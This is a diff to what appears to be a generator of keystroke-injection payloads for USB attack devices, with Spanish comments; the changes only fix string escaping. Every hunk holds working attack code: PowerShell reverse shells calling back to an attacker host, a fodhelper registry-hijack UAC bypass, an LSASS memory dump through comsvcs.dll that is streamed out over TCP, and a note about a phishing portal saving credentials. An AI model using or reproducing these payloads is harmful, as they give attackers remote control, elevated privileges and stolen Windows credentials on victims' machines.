@@ -149,7 +149,7 @@ DELAY 400
 STRING powershell -W H -NoP -NonI -Exec Bypass
 ENTER
 DELAY 600
-STRING $cmd="powershell -W H -NoP -NonI -Exec Bypass -C \\"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($o),0,$o.Length)}}\\""; New-Item -Force -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Value $cmd; New-ItemProperty -Force -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""; Start-Process fodhelper.exe; Start-Sleep 3; Remove-Item -Force -Recurse "HKCU:\Software\Classes\ms-settings"
+STRING $cmd="powershell -W H -NoP -NonI -Exec Bypass -C \\"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$s.Write([text.encoding]::ASCII.GetBytes($o),0,$o.Length)}}\\""; New-Item -Force -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Value $cmd; New-ItemProperty -Force -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "DelegateExecute" -Value ""; Start-Process fodhelper.exe; Start-Sleep 3; Remove-Item -Force -Recurse "HKCU:\\Software\\Classes\\ms-settings"
 ENTER
 """,
     },
@@ -249,7 +249,7 @@ GUI x
 DELAY 400
 STRING a
 DELAY 800
-STRING $id=(Get-Process lsass).Id; rundll32 C:\windows\system32\comsvcs.dll MiniDump $id C:\Windows\Temp\lsass.dmp full
+STRING $id=(Get-Process lsass).Id; rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump $id C:\\Windows\\Temp\\lsass.dmp full
 ENTER
 DELAY 3000
 STRING powershell -W H -C "$b=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\lsass.dmp');$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();$s.Write($b,0,$b.Length);$c.Close()"
@@ -379,10 +379,10 @@ Q ENTER
 Q DELAY 800
 
 # Esperar que Bunny obtenga IP en la víctima (169.254.x.x APIPA típicamente)
-BUNNY_IP=$(ip addr show usb0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){{3}}' | head -1)
+BUNNY_IP=$(ip addr show usb0 2>/dev/null | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){{3}}' | head -1)
 : "${{BUNNY_IP:={lhost}}}"
 
-Q STRING "$c=New-Object Net.Sockets.TCPClient('$BUNNY_IP',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=\$s.Read(\$b,0,\$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);$o=(iex \$d 2>&1|Out-String);\$s.Write([text.encoding]::ASCII.GetBytes(\$o),0,\$o.Length)}}"
+Q STRING "$c=New-Object Net.Sockets.TCPClient('$BUNNY_IP',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=\\$s.Read(\\$b,0,\\$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString(\\$b,0,\\$i);$o=(iex \\$d 2>&1|Out-String);\\$s.Write([text.encoding]::ASCII.GetBytes(\\$o),0,\\$o.Length)}}"
 Q ENTER
 
 LED FINISH
@@ -526,7 +526,7 @@ echo "Portal activo — credenciales en /tmp/creds.txt"
 LED R SOLID
 
 # Obtener IP local para determinar red
-IP=$(ip addr show eth0 | grep -oP '(?<=inet\s)\\d+(\\.(\\d+)){{3}}')
+IP=$(ip addr show eth0 | grep -oP '(?<=inet\\s)\\d+(\\.(\\d+)){{3}}')
 SUBNET=$(echo $IP | cut -d'.' -f1-3).0/24
 
 LED G BLINK
